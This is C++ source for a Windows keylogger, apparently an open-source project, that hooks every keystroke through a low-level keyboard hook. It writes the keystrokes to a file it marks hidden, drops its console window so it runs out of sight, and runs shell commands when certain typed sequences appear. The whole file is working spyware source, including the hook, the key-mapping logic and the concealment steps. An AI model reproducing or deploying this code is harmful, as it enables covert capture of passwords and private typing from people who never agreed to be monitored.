/*
*
*
*   Minimalist { Windows } KeyLogger
*   (c) Dyrk.org 2019 - 2020
*
*
*/


#include "main.h"
/*
*
*   Main File
*
*
*
**/

// Hook to detect Keyboard Event - Need GetMessage to Work
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam){
    wchar_t title[256];
    PKBDLLHOOKSTRUCT key = (PKBDLLHOOKSTRUCT)lParam;

    switch(wParam){
        case WM_KEYDOWN :
            // detect if shift or capslock is pressed
            bool isShift    = ((GetKeyState(VK_SHIFT) & 0x80) == 0x80 ? true : false);
            bool isCapslock = (GetKeyState(VK_CAPITAL) != 0 ? true : false);

            switch (key->vkCode){
                case VK_BACK:               writeFileString(_KEYLOG_FILENAME_, " "); break;
                case VK_CANCEL:             writeFileString(_KEYLOG_FILENAME_, "\n<Cancel>\n"); break;
                case VK_CAPITAL:            writeFileString(_KEYLOG_FILENAME_, "\n<CapsLock>\n"); break;
                case VK_CLEAR:              writeFileString(_KEYLOG_FILENAME_, "\n<Clear>\n"); break;
                case VK_CRSEL:              writeFileString(_KEYLOG_FILENAME_, ""); break;
                case VK_DECIMAL:            writeFileString(_KEYLOG_FILENAME_, ","); break;
                case VK_DELETE:             writeFileString(_KEYLOG_FILENAME_, "\n<Delete>\n"); break;
                case VK_DIVIDE:             writeFileString(_KEYLOG_FILENAME_, "/"); break;
                case VK_DOWN:               writeFileString(_KEYLOG_FILENAME_, "\n<Down>\n"); break;
                case VK_END:                writeFileString(_KEYLOG_FILENAME_, "\n<End>\n"); break;
                case VK_ESCAPE:             writeFileString(_KEYLOG_FILENAME_, "\n<Escape>\n"); break;
                case VK_EXECUTE:            writeFileString(_KEYLOG_FILENAME_, "\n<Execute>\n"); break;
                case VK_HELP:               writeFileString(_KEYLOG_FILENAME_, "\n<F1/HELP>\n"); break;
                case VK_HOME:               writeFileString(_KEYLOG_FILENAME_, "\n<Home>\n"); break;
                case VK_INSERT:             writeFileString(_KEYLOG_FILENAME_, "\n<Insert>\n"); break;
                case VK_LAUNCH_MAIL:        writeFileString(_KEYLOG_FILENAME_, "\n<Mail>\n"); break;
                case VK_LBUTTON:            writeFileString(_KEYLOG_FILENAME_, ""); break;
                case VK_LEFT:               writeFileString(_KEYLOG_FILENAME_, "\n<Left>\n"); break;
                case VK_LMENU:              writeFileString(_KEYLOG_FILENAME_, ""); break;
                case VK_LSHIFT:             writeFileString(_KEYLOG_FILENAME_, "\n<Shift>\n"); break;
                case VK_LWIN:               writeFileString(_KEYLOG_FILENAME_, "\n<Windows>\n"); break;
                case VK_MENU:               writeFileString(_KEYLOG_FILENAME_, "\n<menu>\n"); break;
                case VK_MULTIPLY:           writeFileString(_KEYLOG_FILENAME_, "*"); break;
                case VK_NUMLOCK:            writeFileString(_KEYLOG_FILENAME_, "\n<NumLock>\n"); break;
                case VK_NUMPAD0:            writeFileString(_KEYLOG_FILENAME_, "0"); break;
                case VK_NUMPAD1:            writeFileString(_KEYLOG_FILENAME_, "1"); break;
                case VK_NUMPAD2:            writeFileString(_KEYLOG_FILENAME_, "2"); break;
                case VK_NUMPAD3:            writeFileString(_KEYLOG_FILENAME_, "3"); break;
                case VK_NUMPAD4:            writeFileString(_KEYLOG_FILENAME_, "4"); break;
                case VK_NUMPAD5:            writeFileString(_KEYLOG_FILENAME_, "5"); break;
                case VK_NUMPAD6:            writeFileString(_KEYLOG_FILENAME_, "6"); break;
                case VK_NUMPAD7:            writeFileString(_KEYLOG_FILENAME_, "7"); break;
                case VK_NUMPAD8:            writeFileString(_KEYLOG_FILENAME_, "8"); break;
                case VK_NUMPAD9:            writeFileString(_KEYLOG_FILENAME_, "9"); break;
                case VK_OEM_1:              writeFileString(_KEYLOG_FILENAME_, isShift == false ? ";" : ":"); break;
                case VK_OEM_102:            writeFileString(_KEYLOG_FILENAME_, isShift == false ? "\\": "|"); break;
                case VK_OEM_2:              writeFileString(_KEYLOG_FILENAME_, isShift == false ? "/" : "?"); break;
                case VK_OEM_3:              writeFileString(_KEYLOG_FILENAME_, isShift == false ? "`" : "~"); break;
                case VK_OEM_4:              writeFileString(_KEYLOG_FILENAME_, isShift == false ? "[" : "{"); break;
                case VK_OEM_5:              writeFileString(_KEYLOG_FILENAME_, isShift == false ? "\\": "|"); break;
                case VK_OEM_6:              writeFileString(_KEYLOG_FILENAME_, isShift == false ? "]" : "}"); break;
                case VK_OEM_7:              writeFileString(_KEYLOG_FILENAME_, isShift == false ? "\'": ""); break;
                case VK_OEM_8:              writeFileString(_KEYLOG_FILENAME_, ""); break;
                case VK_OEM_CLEAR:          writeFileString(_KEYLOG_FILENAME_, ""); break;
                case VK_OEM_COMMA:          writeFileString(_KEYLOG_FILENAME_, isShift == false?",":"<"); break;
                case VK_OEM_MINUS:          writeFileString(_KEYLOG_FILENAME_, isShift == false?"-":"_"); break;
                case VK_OEM_PERIOD:         writeFileString(_KEYLOG_FILENAME_, isShift == false?".":">"); break;
                case VK_OEM_PLUS:           writeFileString(_KEYLOG_FILENAME_, isShift == false?"=":"+"); break;
                case VK_PA1:                writeFileString(_KEYLOG_FILENAME_, ""); break;
                case VK_PAUSE:              writeFileString(_KEYLOG_FILENAME_, ""); break;
                case VK_PLAY:               writeFileString(_KEYLOG_FILENAME_, ""); break;
                case VK_PRINT:              writeFileString(_KEYLOG_FILENAME_, "\n<Print>\n"); break;
                case VK_PRIOR:              writeFileString(_KEYLOG_FILENAME_, ""); break;
                case VK_RBUTTON:            writeFileString(_KEYLOG_FILENAME_, ""); break;
                case VK_RIGHT:              writeFileString(_KEYLOG_FILENAME_, "\n<Right>\n"); break;
                case VK_RMENU:              writeFileString(_KEYLOG_FILENAME_, ""); break;
                case VK_RSHIFT:             writeFileString(_KEYLOG_FILENAME_, "\n<Shift>\n"); break;
                case VK_RWIN:               writeFileString(_KEYLOG_FILENAME_, "\n<Windows>\n"); break;
                case VK_SCROLL:             writeFileString(_KEYLOG_FILENAME_, "\n<Scroll>\n"); break;
                case VK_F1:                case VK_F2:                case VK_F3:                case VK_F4:
                case VK_F5:                case VK_F6:                case VK_F7:                case VK_F8:
                case VK_F9:                case VK_F10:               case VK_F11:               case VK_F12:
                case VK_F13:               case VK_F14:               case VK_F15:               case VK_F16:
                case VK_F17:               case VK_F18:               case VK_F19:               case VK_F20:
                case VK_F21:               case VK_F22:               case VK_F23:               case VK_F24:
                    writeFileString(_KEYLOG_FILENAME_, "\n<Function F{1,12}>\n");
                    break;
                case VK_CONTROL:
                case VK_RCONTROL:
                case VK_LCONTROL:
                    writeFileString(_KEYLOG_FILENAME_, "\n<Control>\n");
                break;

                case VK_RETURN:
                    writeFileString(_KEYLOG_FILENAME_, "\n");
                break;
                default :
                    if (key->vkCode == 0x0d && (key->flags & LLKHF_EXTENDED) != 0) { // check if it's the enter on the numpad
                        key->vkCode = 0x0e;
                    }

                    // Convert uppercase to lowercase if needed (shift, capsLock)
                    if (((isCapslock == false && isShift == false) || (isCapslock == true && isShift == true))  && key->vkCode >=65 && key->vkCode<=90) {
                       key->vkCode = key->vkCode + 32;
                    }



                    // Purge bufferString if exceeded Secret Code Size
                    if (bufferString.length() > 50){
                        bufferString = "";
                    }
                    bufferString.append(1,key->vkCode);
                    detectCurrentCode();
                    appendFile(_KEYLOG_FILENAME_, key->vkCode);
                break;
            }
        break;
     }
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}


// Quick way to detect if File exist
bool logFileExist(char *filename){
    if (debug == false) return -1;
    struct stat buffer;
    return (stat (filename, &buffer) == 0);
}


// Create Hidden File
void createFile(char *filename, bool hidden){
    if (debug) {
        FILE *pFile;
        if (logFileExist(filename) == false){
            pFile = fopen(filename, "w");
            fprintf(pFile, "");
            fclose(pFile);
            if (hidden == true){
                DWORD attributes = GetFileAttributes(filename);
                SetFileAttributes(filename, FILE_ATTRIBUTE_HIDDEN);
            }
        }
    }
}


// add character in file
bool appendFile(char *filename, char letter){
    if (debug == false) return false;
    FILE *pFile;
    pFile = fopen(filename, "a+");
    if (pFile != NULL) {
        fprintf(pFile, "%c", letter);
        fclose(pFile);
        return true;
    }
    return false;
}

// add text in file
bool writeFileString(char *filename, const char *str){
    if (debug == false) return false;
    FILE *pFile;
    pFile = fopen(filename, "a+");
    if (pFile != NULL) {
        fprintf(pFile, "%s", str);
        fclose(pFile);
        return true;
    }
    return false;
}

// Here you can add some Secrets Sequences to make specifics actions
void detectCurrentCode(){
    writeFileString(_KEYLOG_FILENAME_, "\nCurrent Buffer >>>");
    writeFileString(_KEYLOG_FILENAME_, bufferString.c_str());

    vector<secretCode> applicationLaunchCode;
    applicationLaunchCode.push_back((secretCode){ .keyCode = "xyxyxy flushdns xyxyxy", .cmd =  "ipconfig /flushdns"});
    applicationLaunchCode.push_back((secretCode){ .keyCode = "xyxyxy ipconfig xyxyxy", .cmd =  "ipconfig"});
    applicationLaunchCode.push_back((secretCode){ .keyCode = "xyxyxy iprelease xyxyxy", .cmd =  "ipconfig /release"});
    applicationLaunchCode.push_back((secretCode){ .keyCode = "xyxyxy iprenew xyxyxy", .cmd =  "ipconfig   /renew"});

    for (int i = 0; i < applicationLaunchCode.size(); i++){
        size_t found = bufferString.find(applicationLaunchCode[i].keyCode);
        if (found!=string::npos){
            bufferString = "cmd /q /k " + applicationLaunchCode[i].cmd;
            system(bufferString.c_str());
            bufferString = "";
        }
    }
}


int main(int argc, char **argv) {
    if (argc > 1) {
        debug = true;
    }
    MSG msg;
    bool bRet;
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    createFile(_KEYLOG_FILENAME_, true);
    FreeConsole();
    while ((bRet = GetMessage( &msg, NULL, 0, 0)) != 0){
            TranslateMessage(&msg);
            DispatchMessage(&msg);
    }
}

